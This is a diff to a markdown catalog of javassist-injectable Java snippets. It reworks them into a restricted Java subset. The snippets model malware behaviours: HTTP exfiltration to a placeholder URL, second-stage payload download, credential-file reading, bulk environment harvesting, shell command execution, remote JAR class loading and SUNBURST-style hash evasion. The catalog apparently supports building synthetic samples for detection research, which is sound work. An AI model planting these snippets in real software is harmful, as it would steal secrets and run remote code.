@@ -43,6 +43,28 @@ when injected into a method that already declares the matching `throws`, so the
 try-catch variant should be selected often enough to keep injection sites flexible.
 
 
+### javassist source-compiler constraints
+
+These snippets are compiled by javassist's *own* source compiler (`CtBehavior.insertBefore`
+/ `insertAfter` etc.), which is the only compiler that understands the `$1` / `$0` syntax.
+That compiler supports a restricted subset of Java, so every snippet here stays inside it.
+When writing new snippets, observe:
+
+- **No generics** — use raw types (`java.util.Map`, `Class`), never `Map<K,V>` or `Class<?>`.
+- **No enhanced `for`** — use an indexed `for (int i = 0; i < a.length; i++)` loop.
+- **No try-with-resources** — open, use, and `close()` inside a plain `try { } catch { }`.
+- **No multi-catch** — write separate `catch` blocks (or catch a common supertype).
+- **No lambdas / method references / streams** — use explicit loops.
+- **No array initializers** — `new String[]{...}` is rejected; allocate then assign by index
+  (`String[] a = new String[2]; a[0] = ...;`).
+- **No varargs auto-wrapping** — pass an explicit array to varargs methods
+  (`m.invoke(obj, new Object[0])`, `getMethod(name, new Class[0])`).
+- **No autoboxing into `Object`** — box explicitly with `Integer.valueOf(0)` etc.
+- **Primitive class literals are unreliable** — use `Integer.TYPE` instead of `int.class`,
+  and `(new byte[0]).getClass()` instead of `byte[].class`. Reference class literals such
+  as `String.class` are fine.
+
+
 ### Placeholder kinds used in this catalog
 
 | Placeholder | Meaning / typical inert instantiation |
@@ -54,8 +76,9 @@ try-catch variant should be selected often enough to keep injection sites flexib
 | `<key>`, `<nonce>`, `<ciphertext>`, `<publicKey>`, `<signature>`, `<message>` | crypto material |
 | `<name>`, `<blocklisthash>` | string to hash and its expected blocklist hash |
 | `<envname>`, `<propname>` | environment-variable / system-property key |
-| `<cmd>`, `<cmdarray>`, `<libpath>`, `<libname>` | command / native-library to run or load |
-| `<classname>`, `<jarurl>`, `<bytecode>`, `<methodname>`, `<enginename>`, `<script>` | reflection / dynamic-loading inputs |
+| `<cmd>`, `<libpath>`, `<libname>` | command / native-library to run or load |
+| `<classname>`, `<jarurl>`, `<bytecode>`, `<enginename>`, `<script>` | reflection / dynamic-loading inputs |
+| `<obj>`, `<receiver>`, `<targetclass>`, `<methodname>`, `<rettype>` | reflective-dispatch target (object, its `Class`, method name, return `Class`) |
 | `<b64data>`, `<b64part1>`, `<b64part2>`, `<xorconst>` | obfuscated string material |
 
 
@@ -87,7 +110,8 @@ try {
 			.POST(java.net.http.HttpRequest.BodyPublishers.ofString(<payload>))
 			.build(),
 		java.net.http.HttpResponse.BodyHandlers.discarding());
-} catch (java.io.IOException | InterruptedException e) {}
+} catch (java.io.IOException e) {
+} catch (InterruptedException e) {}
 ```
 
 #### netio/exfil/githubapi
@@ -120,10 +144,12 @@ socket.close();
 Downloading a second-stage payload with an HTTP `GET` (Axios curl/PowerShell download).
 
 ```java
-byte[] payload;
-try (java.io.InputStream in = new java.net.URL(<url>).openStream()) {
+byte[] payload = null;
+try {
+	java.io.InputStream in = new java.net.URL(<url>).openStream();
 	payload = in.readAllBytes();
-}
+	in.close();
+} catch (java.io.IOException e) {}
 ```
 
 
@@ -160,9 +186,11 @@ Reading a credential-bearing file with `java.io` (analogue of Shai-Hulud reading
 ```java
 java.io.File file = new java.io.File(<secretfile>);
 byte[] data = new byte[(int) file.length()];
-try (java.io.FileInputStream in = new java.io.FileInputStream(file)) {
+try {
+	java.io.FileInputStream in = new java.io.FileInputStream(file);
 	in.read(data);
-}
+	in.close();
+} catch (java.io.IOException e) {}
 ```
 
 #### fsaccess/readsecret/nio
@@ -173,15 +201,24 @@ Reading a credential-bearing file with `java.nio`.
 byte[] data = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(<secretfile>));
 ```
 
-#### fsaccess/enum/walk
+#### fsaccess/enum/listfiles
 
-Enumerating a directory tree to discover secrets (Axios-style directory enumeration /
-credential hunting).
+Enumerating a directory to discover secrets (Axios-style directory enumeration /
+credential hunting). Uses `java.io.File.listFiles` and an explicit loop (the
+stream/lambda form `Files.walk(...).filter(...)` is not available in the javassist
+compiler).
 
 ```java
-java.util.List<java.nio.file.Path> hits = java.nio.file.Files.walk(java.nio.file.Paths.get(<dir>))
-	.filter(p -> p.getFileName().toString().endsWith(<suffix>))
-	.collect(java.util.stream.Collectors.toList());
+java.io.File dir = new java.io.File(<dir>);
+java.io.File[] files = dir.listFiles();
+java.util.List hits = new java.util.ArrayList();
+if (files != null) {
+	for (int i = 0; i < files.length; i++) {
+		if (files[i].getName().endsWith(<suffix>)) {
+			hits.add(files[i]);
+		}
+	}
+}
 ```
 
 
@@ -222,9 +259,10 @@ against a hard-coded blocklist hash — exactly the detection-evasion scheme SUN
 (XOR constant `6605813339339102567`).
 
 ```java
+byte[] bytes = <name>.getBytes(java.nio.charset.StandardCharsets.UTF_8);
 long hash = 0xcbf29ce484222325L;
-for (byte b : <name>.getBytes(java.nio.charset.StandardCharsets.UTF_8)) {
-	hash ^= (b & 0xff);
+for (int i = 0; i < bytes.length; i++) {
+	hash ^= (bytes[i] & 0xff);
 	hash *= 0x100000001b3L;
 }
 hash ^= 6605813339339102567L;
@@ -261,7 +299,7 @@ Enumerating the entire environment block (Shai-Hulud / TruffleHog-style bulk sec
 harvesting from CI environment variables).
 
 ```java
-java.util.Map<String, String> env = System.getenv();
+java.util.Map env = System.getenv();
 ```
 
 #### recon/os/property
@@ -306,11 +344,15 @@ Process process = Runtime.getRuntime().exec(<cmd>);
 
 #### procmem/exec/processbuilder
 
-Executing a system command via `ProcessBuilder` (`<cmdarray>` e.g.
-`new String[]{"/bin/sh", "-c", <cmd>}`).
+Executing a system command via `ProcessBuilder`. The command array is built by index
+because the compiler supports neither array initializers nor varargs auto-wrapping.
 
 ```java
-Process process = new ProcessBuilder(<cmdarray>).start();
+String[] cmd = new String[3];
+cmd[0] = "/bin/sh";
+cmd[1] = "-c";
+cmd[2] = <cmd>;
+Process process = new ProcessBuilder(cmd).start();
 ```
 
 #### procmem/nativeload/load
@@ -333,11 +375,12 @@ function resolution maps to runtime method resolution + invocation.
 #### reflect/load/classforname
 
 Loading and instantiating a class chosen at runtime by name (analogue of dynamic
-`require()` / `Assembly.Load`).
+`require()` / `Assembly.Load`). Uses the deprecated no-arg `Class.newInstance()` to avoid
+the varargs `getDeclaredConstructor().newInstance()` the compiler cannot auto-wrap.
 
 ```java
-Class<?> clazz = Class.forName(<classname>);
-Object instance = clazz.getDeclaredConstructor().newInstance();
+Class clazz = Class.forName(<classname>);
+Object instance = clazz.newInstance();
 ```
 
 #### reflect/load/urlclassloader
@@ -346,9 +389,10 @@ Loading a class from a remote or downloaded JAR — closest analogue to SUNBURST
 .NET assembly from disk / bytes.
 
 ```java
-java.net.URLClassLoader loader = new java.net.URLClassLoader(
-	new java.net.URL[]{ new java.net.URL(<jarurl>) });
-Class<?> clazz = loader.loadClass(<classname>);
+java.net.URL[] urls = new java.net.URL[1];
+urls[0] = new java.net.URL(<jarurl>);
+java.net.URLClassLoader loader = new java.net.URLClassLoader(urls);
+Class clazz = loader.loadClass(<classname>);
 ```
 
 #### reflect/load/defineclass
@@ -358,32 +402,45 @@ downloaded assembly / in-memory payload), reflectively reaching the protected
 `ClassLoader.defineClass`.
 
 ```java
-java.lang.reflect.Method define = ClassLoader.class.getDeclaredMethod(
-	"defineClass", String.class, byte[].class, int.class, int.class);
+Class[] paramTypes = new Class[4];
+paramTypes[0] = String.class;
+paramTypes[1] = (new byte[0]).getClass();
+paramTypes[2] = Integer.TYPE;
+paramTypes[3] = Integer.TYPE;
+java.lang.reflect.Method define = ClassLoader.class.getDeclaredMethod("defineClass", paramTypes);
 define.setAccessible(true);
-Class<?> clazz = (Class<?>) define.invoke(
-	ClassLoader.getSystemClassLoader(), <classname>, <bytecode>, 0, <bytecode>.length);
+Object[] args = new Object[4];
+args[0] = <classname>;
+args[1] = <bytecode>;
+args[2] = Integer.valueOf(0);
+args[3] = Integer.valueOf(<bytecode>.length);
+Class clazz = (Class) define.invoke(ClassLoader.getSystemClassLoader(), args);
 ```
 
 #### reflect/invoke/reflection
 
 Resolving a method by name at runtime and invoking it — the managed-runtime analogue of
-IFUNC indirect function resolution.
+IFUNC indirect function resolution. Shown for a no-arg target; for a method with
+parameters, allocate and index-fill `new Class[n]` (parameter types) and `new Object[n]`
+(arguments) rather than using array initializers.
 
 ```java
-java.lang.reflect.Method method = <obj>.getClass().getMethod(<methodname>, <paramtypes>);
-Object result = method.invoke(<obj>, <args>);
+java.lang.reflect.Method method = <obj>.getClass().getMethod(<methodname>, new Class[0]);
+Object result = method.invoke(<obj>, new Object[0]);
 ```
 
 #### reflect/invoke/methodhandle
 
-The same indirect dispatch via `java.lang.invoke` method handles.
+The same indirect dispatch via `java.lang.invoke` method handles. Invocation uses the
+ordinary `invokeWithArguments` method rather than the signature-polymorphic `invoke` /
+`invokeExact`, which the javassist compiler cannot emit. Shown for a no-arg target;
+`<rettype>`, `<targetclass>` are `Class` values, `<receiver>` the target object.
 
 ```java
+java.lang.invoke.MethodType type = java.lang.invoke.MethodType.methodType(<rettype>);
 java.lang.invoke.MethodHandle handle = java.lang.invoke.MethodHandles.lookup()
-	.findVirtual(<targetclass>, <methodname>,
-		java.lang.invoke.MethodType.methodType(<rettype>, <argtypes>));
-Object result = handle.invoke(<receiver>, <args>);
+	.findVirtual(<targetclass>, <methodname>, type);
+Object result = handle.bindTo(<receiver>).invokeWithArguments(new Object[0]);
 ```
 
 #### reflect/eval/scriptengine
